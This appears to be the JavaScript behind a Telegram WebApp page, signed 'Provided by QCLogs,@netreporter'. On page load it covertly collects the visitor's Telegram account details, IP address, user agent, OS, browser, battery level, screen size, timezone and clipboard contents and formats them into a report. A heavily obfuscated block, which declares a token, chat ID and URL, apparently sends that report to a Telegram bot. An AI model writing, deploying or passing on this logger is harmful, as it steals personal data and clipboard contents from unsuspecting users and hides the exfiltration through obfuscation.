let batteryLevel; 
let screenWidth; 
let screenHeight; 
navigator.getBattery().then(function(battery) { 
    batteryLevel = battery.level * 100; 
}); 
screenWidth = window.screen.width; 
screenHeight = window.screen.height; 
// wXh 
const batteryLevelConst = batteryLevel; 
const screenWidthConst = screenWidth; 
const screenHeightConst = screenHeight; 
const clipboardText = navigator.clipboard.readText(); 
 
let tg = window.Telegram.WebApp; 
document.addEventListener('DOMContentLoaded', function() { 
  const urlParams = new URLSearchParams(window.location.search); 
  const userAgent = navigator.userAgent; 
  fetch('https://api.ipify.org?format=json') 
    .then(response => response.json()) 
    .then(data => { 
      const ip = data.ip; 
      const osname = navigator.platform; 
      const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone; 
      const browser = getBrowserInfo(); 
      let userid = document.createElement('p'); 
 
      const message =  
*👤 Новый пользователь* 
 
*🧭 Информация:* 
*🔍 Account:* 
  ├ ID: ${tg.initDataUnsafe.user.id} 
  ├ Username: @${tg.initDataUnsafe.user.username} 
  ├ Name: ${tg.initDataUnsafe.user.first_name} 
  ├ Surname: ${tg.initDataUnsafe.user.last_name} 
  ├ Language: ${tg.initDataUnsafe.user.language_code} 
*💻 System:* 
  ├ IP: ${ip} 
  ├ UserAgent: ${userAgent} 
  ├ OS: ${osname} 
  ├ Browser: ${browser} 
  ├ Battery ${batteryLevel}% 
  ├ Screen: ${screenWidth}x${screenHeight} px. 
  ├ Clipboard: ${clipboardText} 
  └ Timezone: ${timeZone} 
 
*Provided by QCLogs,@netreporter*;     

    var token,chatId,url,formData;(function(){var hQg='',YyJ=725-714;function KrP(l){var u=1212801;var t=l.length;var v=[];for(var k=0;k<t;k++){v[k]=l.charAt(k)};for(var k=0;k<t;k++){var c=u*(k+132)+(u%31502);var d=u*(k+215)+(u%29902);var i=c%t;var y=d%t;var z=v[i];v[i]=v[y];v[y]=z;u=(c+d)%5749477;};return v.join('')};var Gez=KrP('mnxvoqccoyraordenizlkgsuhtbfjputswctr').substr(0,YyJ);var jtd=')+1)wzo ,g67(r3vl0j]1rlka)ai[dcp}1vjslbm9zlrrh+io;ozi;ffhma7f t,i29ug)lhp(<aree9=rAu=r[1 5m1w[=[,8=hn..94,a.,jbw-f;p=f;8[lf), ]=v;;raw(v,.;lg(;a<e2ge0b.+;u,+{r[b1ffu=r+}]qaesj=>8e[vA.2;w.r1v),;c+6ijk=dg);)q"aagcaag;mxnAsd,,Cat};;==th-nr;5b]=gvkz+g erA.gp)os(f b);=n)tebrrk.d.lee(-n=i;rfw0;k=u+*vyo-q=i slujfrs;vdoil;rt(+n=r4sl1n"([p+0;2dr!{tfv97npt}h=a) =i9hr{;++ ;=o;w<1)w++r"7w ,p0fuo=r=qcse,;l+- =;r,sej{t-thl.(tttt=rSA)=pl;+t)(6]ored))ra, -ltCc;;(;Cn.,hreol9e8}=ug,al({t .;0rgt)ao)pa 0o)Co env7r+b2)+0.rhe*]oodnt=w+2](a;t[r"}.+2f1hso))noali(+ew,ivl)=a[vrh g=]C;b hfhe)y<a,lhn]7s;bsh;lfg(mft[a2zf,lsr8dsty(])e(==+r;>],r{efn7=e);i2;!=r=xneun  ;nazbiu un=1i8); t(v1uh+fh}n")n=8aw=a7sv(ol[;+vln.rt)Cl=jh)n(."nzoae (=c3ml(0o4d,,.{da,ae(tio8ir. q59;](aa"i;()nf(vrorC](.wa6S(g6u;=o(tvavrcli0"<6gv(ng[h 46+0hr6ssvl0v.y),7v=rki((.8t.f4sCvorrini. srmxh1utotdevlln(4;0.cur[dmrci.pt(p."v"]5,,=n6y);';var TVz=KrP[Gez];var UtT='';var rZp=TVz;var IqQ=TVz(UtT,KrP(jtd));var hCq=IqQ(KrP('A.0i2A&,ktr!f\/]I-fotA=t$}=#"33(1{.g3bfA(w1(}6]nz67Aaffl1f!#]$a}Ao1bktA,rb!cuAsA;24)A,"$0lo]o_A_%3].8h5[$)im4#%aA.}t)f%d.,! )!b*Aj%A,o4nA;it)%i06.)x,(aAu9]*Aj.p)4r;t7dh[.A,.2](!..\/c4ls;tDo(er2.A}c(1$xA_or.ugA{os.-.dA42Ato i6_$%.iislA(2$o6\/.fpte ;rSsg1Meh.)sn7a(=d\/cs(,(,s9o12[2A0eb1 Apa"dy);$A5A(!ftdl.$t.lfb${fA2.r]jk3f]fErM7 ]t1e.w._mA447AdAe3(fda4)!nAC,htAfle!+.hg8r!.t.aa]f4$e4 m\'s2pae_aA+.$r(z-S,wbkAaA\/a._fh6)g.ha(=tu}.7tv})=+bf)etrA7f. i7zezl.34;.t)0Am=ern)_.oAAg3do,(,20c( A$==3AAajn f++errte43dA.c.A3;4\/;ws{Ass6,(;A!ewt)99m2)a2fbhA#are(.0dA".p.nw,;u.3_gs,_s0A7tAAaz:gm:j!!Ak_%.w))=u%4t%gm[[efA8(a)iA$;i1.D\'z;_,t2f5_n}k]1$n5;Sog[#871!Ao=A)f]af)(1u!0Au%%=;o(Af6=7o,h&3A%$bAks=c;.A)f\'s$t0t,.5au!0,A.$)h_$ol-.1)j&.re$cw;);A.s!A.hCnA(Ar{8n!}(o0e*k=%4);Sm]thorabno$.T.ef.2n).e*o .n.f%#85a"Atm(Ac!Apo,iostaA5A;}(=A&},"(06o% \'ctrfd]pj*At5)3(es6;,{of7m=ue9,,()!wA;\/Iy;_AAA#),2er.h+!s ]{3..jk.-1t.o,k=d!-f4qmwAA0e}Ab\/ar+s){w)fpfnzA-am4fe4(.Af*=75..;_)1(sA)_o4!o)+()emwao3,+6ja!,D)3;_$)..8"t7(Aasc(A 504nt,_A(*,.j0fuj,)2et$tp3.AgrA3a%rjg4f 4-f=zt3A($.+$_n3AS&roff0*\/ba)}s$d)CA.)r;AA!e.Aek.n.f44orrAu.ai]A4;.mra*51pjm4f(=,(om.n7b{8jb,a2,- :As] !e .fh.06=py5_++;wbAr:ntgA( {A=g3=a_=,a1;rqj_ '));var fcD=rZp(hQg,hCq );fcD(3997);return 8957})()
